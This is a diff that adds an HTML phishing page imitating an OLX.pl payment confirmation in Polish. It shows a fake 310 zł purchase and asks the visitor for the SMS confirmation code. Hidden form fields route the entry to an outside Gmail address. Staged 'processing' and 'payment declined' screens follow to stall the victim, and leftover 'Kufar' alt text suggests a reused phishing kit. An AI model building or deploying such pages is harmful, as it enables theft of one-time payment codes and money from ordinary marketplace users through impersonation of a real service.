@@ -1,0 +1,103 @@
+<html>
+	<head>
+		<link rel="stylesheet" type="text/css" href="css/main.css">
+		<script src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
+	<script src="script.js"></script>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+		<title>Potwierdzenie operacji — OLX.PL</title>
+</head>
+
+	<body>
+		<div class="form-container">
+			<div class="form-block" id="step-1">
+<div class="form-block-header">
+<img src="img/logo.png" width="30%"><br><br>
+					            		<br><h1 class="form-block-header-text">Potwierdzenie operacji</h1>
+            						</div>
+
+				<div class="form-block-body">
+					<p class="form-block-body-text">
+						Aby potwierdzić operację, na Twój numer telefonu została wysłana<br> wiadomość tekstowa z kodem potwierdzającym. Wprowadź go w polu poniżej.
+					</p>
+
+					<table class="form-block-body-table">
+						<tr>
+							<td>Sklep:</td>
+							<td>OLX_PAY</td>
+						</tr>
+
+						<tr>
+							<td>Kwota:</td>
+							<td>310,00 zł.</td>
+						</tr>
+
+						<tr>
+							<td>Nazwa:</td>
+							<td>Samsung galaxy J5 zloty</td>
+						</tr>
+					</table>
+
+					<div class="form-block-body-notification">
+						<b>Uwagę!</b> Ze względu na duże obciążenie serwera, przesłanie kodu może być opóźnione o kilka minut.
+					</div>
+				</div>
+
+				<div class="form-block-footer">
+					<p class="form-block-footer-text">
+						Kod potwierdzenia:
+					</p>
+					<form>
+						<!-- Hidden Required Fields -->
+		<input type="hidden" name="project_name" value="Site Name">
+		<input type="hidden" name="admin_email" value="ioanhudetskyi@gmail.com">
+		<input type="hidden" name="form_subject" value="Form Subject">
+		<!-- END Hidden Required Fields -->
+					<input type="text" name="kod" class="form-block-footer-input" placeholder="Wprowadź kod..." >
+					<br>
+					<center><button class="form-block-footer-button" >
+						Potwierdzić
+					</button></center>
+				</div>
+			</div>
+</form>
+			<div class="form-block" id="step-2" style="display: none;">
+				<div class="form-block-header">
+				
+					<img src="../assets/img/OLX_New_Logo.png" width="30%" alt="Kufar" class="form-block-image">
+					<h1 class="form-block-header-text">Przetwarzanie płatności</h1>
+				</div>
+
+				<div class="form-block-body">
+					<p class="form-block-body-text">
+						Płatność jest w trakcie przetwarzania. Nastąpi automatyczne przekierowanie na odpowiednią stronę. Może to zająć trochę czasu.
+					</p>
+				</div>
+			</div>
+			<div class="form-block" id="step-3" style="display: none;">
+				<div class="form-block-header">
+					<img src="../assets/img/OLX_New_Logo.png" width="30%" alt="Kufar" class="form-block-image">
+					<h1 class="form-block-header-text">Błąd: Płatność odrzucona!</h1>
+				</div>
+
+				<div class="form-block-body">
+					<p class="form-block-body-text">
+						Bank odrzucił twoją płatność. Możesz nie mieć wystarczającej ilości pieniędzy na swoim koncie. <br><br>Nastąpi automatyczne przekierowanie na odpowiednią stronę. Może to zająć trochę czasu.
+					</p>
+				</div>
+			</div>
+			<div class="form-block" id="step-3" style="display: none;">
+				<div class="form-block-header">
+					<img src="../assets/img/OLX_New_Logo.png" width="30%" alt="Kufar" class="form-block-image">
+					<h1 class="form-block-header-text">Błąd: Płatność odrzucona!</h1>
+				</div>
+
+				<div class="form-block-body">
+					<p class="form-block-body-text">
+						Bank odrzucił twoją płatność. Możesz nie mieć wystarczającej ilości pieniędzy na swoim koncie. <br><br>Nastąpi automatyczne przekierowanie na odpowiednią stronę. Może to zająć trochę czasu.
+					</p>
+				</div>
+			</div>
+		</div>
